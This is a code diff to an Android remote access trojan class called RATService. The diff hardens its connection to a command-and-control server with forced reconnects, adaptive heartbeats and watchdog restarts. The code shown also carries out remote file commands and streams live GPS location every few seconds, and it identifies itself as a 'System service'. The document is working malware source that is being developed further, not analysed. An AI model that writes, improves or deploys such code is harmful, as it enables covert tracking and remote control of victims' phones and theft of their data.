@@ -64,7 +64,11 @@ public class RATService extends Service {
     private static final int CONNECT_TIMEOUT = 30000; // 30 seconds (was 15)
     private static final int SOCKET_TIMEOUT = 60000;  // 60 seconds (was 30)
     private static final int MAX_RETRY_DELAY = 300000; // 5 minutes max (was 60 seconds)
-    private static final int HEARTBEAT_INTERVAL = 25000; // 25 seconds
+    
+    // ADDED: Connection rotation to prevent carrier timeouts
+    private static final int HEARTBEAT_INTERVAL = 20000; // 20 seconds
+    private static final int MAX_CONNECTION_AGE = 45000; // 45 seconds - reconnect before carrier kills it (observed 61s)
+    private static final int[] HEARTBEAT_INTERVALS = {15, 18, 20, 22, 25, 28, 30}; // Adaptive intervals in seconds
     
     private Socket socket;
     private PrintWriter out;
@@ -73,10 +77,17 @@ public class RATService extends Service {
     private Thread connectionThread;
     private Thread heartbeatThread;
     private Thread watchdogThread;
+    private Thread reconnectSchedulerThread;
     private static volatile RATService instance;
     private PowerManager.WakeLock wakeLock;
     private int currentRetryDelay = 5000; // Start with 5 seconds
     private int consecutiveFailures = 0;
+    private int heartbeatInterval = HEARTBEAT_INTERVAL;
+    private int heartbeatIndex = 0;
+    
+    // ADDED: Connection age tracking
+    private long connectionStartTime = 0;
+    private AtomicBoolean isReconnectScheduled = new AtomicBoolean(false);
     
     // Network monitoring
     private ConnectivityManager connectivityManager;
@@ -219,15 +230,7 @@ public class RATService extends Service {
                 PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                 String packageName = getPackageName();
                 if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                    // We can't directly request this without user interaction
-                    // But we can log it and the user can grant manually
                     Log.d(TAG, "Battery optimization not ignored. User may need to grant manually.");
-                    
-                    // Optionally open settings (commented out to avoid disturbing user)
-                    // Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    // intent.setData(Uri.parse("package:" + packageName));
-                    // intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    // startActivity(intent);
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Error checking battery optimization", e);
@@ -249,9 +252,7 @@ public class RATService extends Service {
                     super.onAvailable(network);
                     Log.d(TAG, "Network available, reconnecting...");
                     isNetworkAvailable = true;
-                    // Reset failure count on network available
                     consecutiveFailures = 0;
-                    // Reconnect immediately when network returns
                     if (!isConnected()) {
                         startConnection();
                     }
@@ -287,13 +288,11 @@ public class RATService extends Service {
                 try {
                     Thread.sleep(CHECK_INTERVAL_MS);
                     
-                    // Check if connection thread is alive
                     if (connectionThread == null || !connectionThread.isAlive()) {
                         Log.w(TAG, "Connection thread dead, restarting...");
                         startConnection();
                     }
                     
-                    // Check if we haven't received heartbeat in a while
                     if (isHeartbeatActive.get() && lastHeartbeatResponse > 0) {
                         long timeSinceLastHeartbeat = System.currentTimeMillis() - lastHeartbeatResponse;
                         if (timeSinceLastHeartbeat > HEARTBEAT_INTERVAL * 3) {
@@ -302,7 +301,6 @@ public class RATService extends Service {
                         }
                     }
                     
-                    // Refresh wake lock
                     if (wakeLock != null && !wakeLock.isHeld()) {
                         acquireWakeLock();
                     }
@@ -425,10 +423,55 @@ public class RATService extends Service {
             return capabilities != null && 
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
         } else {
-            // Deprecated in API 29 but needed for older versions
             android.net.NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
             return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
         }
+    }
+    
+    // ADDED: Adaptive heartbeat based on connection stability
+    private void adaptiveHeartbeat() {
+        if (consecutiveFailures > 3) {
+            heartbeatIndex = (heartbeatIndex + 1) % HEARTBEAT_INTERVALS.length;
+            heartbeatInterval = HEARTBEAT_INTERVALS[heartbeatIndex] * 1000;
+            Log.d(TAG, "Adjusting heartbeat to " + (heartbeatInterval/1000) + " seconds (failures: " + consecutiveFailures + ")");
+        }
+    }
+    
+    // ADDED: Schedule forced reconnection before carrier timeout
+    private void scheduleForcedReconnect() {
+        if (isReconnectScheduled.getAndSet(true)) {
+            return; // Already scheduled
+        }
+        
+        if (reconnectSchedulerThread != null && reconnectSchedulerThread.isAlive()) {
+            reconnectSchedulerThread.interrupt();
+        }
+        
+        reconnectSchedulerThread = new Thread(() -> {
+            try {
+                // Sleep for 45 seconds (less than the 61s disconnect time)
+                Thread.sleep(MAX_CONNECTION_AGE);
+                
+                // Check if we're still connected and it's time to reconnect
+                if (isConnected() && isRunning.get() && !isReconnectScheduled.get()) {
+                    Log.d(TAG, "Forcing graceful reconnection to avoid carrier timeout");
+                    
+                    // Send a special command to server indicating reconnect
+                    sendCommand("RECONNECTING");
+                    
+                    // Small delay to ensure command is sent
+                    Thread.sleep(500);
+                    
+                    // Force close this connection - outer loop will reconnect
+                    closeConnection();
+                }
+            } catch (InterruptedException e) {
+                Log.d(TAG, "Reconnect scheduler interrupted");
+            } finally {
+                isReconnectScheduled.set(false);
+            }
+        });
+        reconnectSchedulerThread.start();
     }
     
     private void startHeartbeat() {
@@ -438,10 +481,10 @@ public class RATService extends Service {
         
         isHeartbeatActive.set(true);
         heartbeatThread = new Thread(() -> {
-            Log.d(TAG, "Heartbeat thread started");
+            Log.d(TAG, "Heartbeat thread started with interval: " + (heartbeatInterval/1000) + "s");
             while (isRunning.get() && isConnected()) {
                 try {
-                    Thread.sleep(HEARTBEAT_INTERVAL);
+                    Thread.sleep(heartbeatInterval);
                     if (isConnected()) {
                         sendCommand("PING");
                         Log.d(TAG, "Heartbeat sent");
@@ -475,34 +518,35 @@ public class RATService extends Service {
         connectionThread = new Thread(() -> {
             while (isRunning.get()) {
                 try {
-                    // Check if network is available first
                     if (!isNetworkAvailable()) {
                         Log.d(TAG, "No network available, waiting...");
-                        Thread.sleep(30000); // Wait 30 seconds before retry
+                        Thread.sleep(30000);
                         continue;
                     }
                     
-                    // Connect with timeout
                     socket = new Socket();
                     socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
                     socket.setSoTimeout(SOCKET_TIMEOUT);
-                    socket.setKeepAlive(true); // Enable TCP keep-alive
-                    socket.setTcpNoDelay(true); // Disable Nagle's algorithm
+                    socket.setKeepAlive(true);
+                    socket.setTcpNoDelay(true);
                     
                     out = new PrintWriter(socket.getOutputStream(), true);
                     in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                     
                     Log.d(TAG, "Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
                     
-                    // Reset retry delay on successful connection
+                    // ADDED: Record connection start time
+                    connectionStartTime = System.currentTimeMillis();
+                    
                     currentRetryDelay = 5000;
                     consecutiveFailures = 0;
                     
-                    // Send initial device info
                     sendDeviceInfo();
                     
-                    // Start heartbeat
                     startHeartbeat();
+                    
+                    // ADDED: Schedule forced reconnect
+                    scheduleForcedReconnect();
                     
                     String line;
                     long lastReadTime = System.currentTimeMillis();
@@ -510,7 +554,14 @@ public class RATService extends Service {
                     while (isRunning.get() && (line = in.readLine()) != null) {
                         lastReadTime = System.currentTimeMillis();
                         
-                        // Update heartbeat response time for PONG responses
+                        // ADDED: Check connection age
+                        long connectionAge = System.currentTimeMillis() - connectionStartTime;
+                        if (connectionAge > MAX_CONNECTION_AGE) {
+                            Log.d(TAG, "Connection max age reached (" + (connectionAge/1000) + "s), gracefully reconnecting...");
+                            sendCommand("RECONNECT");
+                            break;
+                        }
+                        
                         if (line.equals("PONG")) {
                             lastHeartbeatResponse = System.currentTimeMillis();
                             Log.d(TAG, "Heartbeat response received");
@@ -519,7 +570,6 @@ public class RATService extends Service {
                         }
                     }
                     
-                    // Check if we timed out
                     if (System.currentTimeMillis() - lastReadTime > SOCKET_TIMEOUT) {
                         Log.d(TAG, "Socket read timeout, reconnecting...");
                     }
@@ -527,18 +577,20 @@ public class RATService extends Service {
                 } catch (SocketTimeoutException e) {
                     Log.e(TAG, "Socket timeout", e);
                     consecutiveFailures++;
+                    adaptiveHeartbeat();
                 } catch (IOException e) {
                     Log.e(TAG, "Connection error: " + e.getMessage());
                     consecutiveFailures++;
+                    adaptiveHeartbeat();
                 } catch (Exception e) {
                     Log.e(TAG, "Unexpected error", e);
                     consecutiveFailures++;
+                    adaptiveHeartbeat();
                 } finally {
                     stopHeartbeat();
                     closeConnection();
                 }
                 
-                // Exponential backoff for retries
                 if (isRunning.get()) {
                     long delay = calculateRetryDelay();
                     Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + consecutiveFailures + ")");
@@ -556,7 +608,6 @@ public class RATService extends Service {
     }
     
     private long calculateRetryDelay() {
-        // Exponential backoff: 5s, 10s, 20s, 40s, 80s, 160s, 300s max
         long delay = 5000 * (long) Math.pow(2, Math.min(consecutiveFailures, 6));
         return Math.min(delay, MAX_RETRY_DELAY);
     }
@@ -601,7 +652,7 @@ public class RATService extends Service {
     
     private void processCommand(String command) {
         String[] parts = command.split("\\|", 2);
-        String cmd = parts[0].toLowerCase().trim(); // Normalize to lowercase
+        String cmd = parts[0].toLowerCase().trim();
         String args = parts.length > 1 ? parts[1] : "";
         
         Log.d(TAG, "Received command: " + cmd + " with args: " + args);
@@ -675,7 +726,6 @@ public class RATService extends Service {
                 }
                 break;
                 
-            // FILE OPERATIONS
             case "files_list":
             case "list_files":
                 if (fileModule != null) {
@@ -830,7 +880,6 @@ public class RATService extends Service {
         }
     }
     
-    // Handle location streaming commands
     private void handleLocationStreamCommand(String args) {
         args = args.trim().toLowerCase();
         
@@ -839,14 +888,12 @@ public class RATService extends Service {
         } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
             stopLocationTracking();
         } else if (args.isEmpty()) {
-            // Return current tracking status
             sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
         } else {
             sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
         }
     }
     
-    // Start live location tracking
     private void startLocationTracking() {
         if (!checkLocationPermission()) {
             sendCommand("LOCATION_STREAM|error: No location permission");
@@ -862,7 +909,6 @@ public class RATService extends Service {
             locationListener = new LocationListener() {
                 @Override
                 public void onLocationChanged(Location location) {
-                    // Send location update immediately
                     String locationJson = createLocationJson(location);
                     sendCommand("LOCATION_UPDATE|" + locationJson);
                     Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
@@ -885,12 +931,11 @@ public class RATService extends Service {
                 }
             };
             
-            // Request location updates every 3 seconds, or when device moves 5 meters
             if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 locationManager.requestLocationUpdates(
                     LocationManager.GPS_PROVIDER,
-                    3000,   // 3 seconds
-                    5,      // 5 meters
+                    3000,
+                    5,
                     locationListener,
                     locationHandler.getLooper()
                 );
@@ -911,7 +956,6 @@ public class RATService extends Service {
             isLocationTracking = true;
             sendCommand("LOCATION_STREAM|started");
             
-            // Get initial location immediately
             Location lastLocation = getBestLastKnownLocation();
             if (lastLocation != null) {
                 String locationJson = createLocationJson(lastLocation);
@@ -927,7 +971,6 @@ public class RATService extends Service {
         }
     }
     
-    // Stop live location tracking
     private void stopLocationTracking() {
         if (locationManager != null && locationListener != null) {
             locationManager.removeUpdates(locationListener);
@@ -940,7 +983,6 @@ public class RATService extends Service {
         }
     }
     
-    // Get best last known location
     private Location getBestLastKnownLocation() {
         Location bestLocation = null;
         
@@ -969,7 +1011,6 @@ public class RATService extends Service {
         return bestLocation;
     }
     
-    // Check location permission
     private boolean checkLocationPermission() {
         return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                 == PackageManager.PERMISSION_GRANTED ||
@@ -977,7 +1018,6 @@ public class RATService extends Service {
                 == PackageManager.PERMISSION_GRANTED;
     }
     
-    // Create JSON from location
     private String createLocationJson(Location location) {
         try {
             JSONObject json = new JSONObject();
@@ -1039,13 +1079,14 @@ public class RATService extends Service {
     public void onDestroy() {
         Log.d(TAG, "System service onDestroy");
         
-        // Stop location tracking
         stopLocationTracking();
-        
-        // Stop heartbeat
         stopHeartbeat();
+        isReconnectScheduled.set(false);
         
-        // Unregister network callback
+        if (reconnectSchedulerThread != null) {
+            reconnectSchedulerThread.interrupt();
+        }
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && connectivityManager != null && networkCallback != null) {
             try {
                 connectivityManager.unregisterNetworkCallback(networkCallback);
@@ -1054,7 +1095,6 @@ public class RATService extends Service {
             }
         }
         
-        // Clean up location thread
         if (locationThread != null) {
             locationThread.quitSafely();
             try {
@@ -1074,6 +1114,7 @@ public class RATService extends Service {
             if (connectionThread != null) connectionThread.interrupt();
             if (watchdogThread != null) watchdogThread.interrupt();
             if (heartbeatThread != null) heartbeatThread.interrupt();
+            if (reconnectSchedulerThread != null) reconnectSchedulerThread.interrupt();
             if (wakeLock != null && wakeLock.isHeld()) {
                 wakeLock.release();
             }
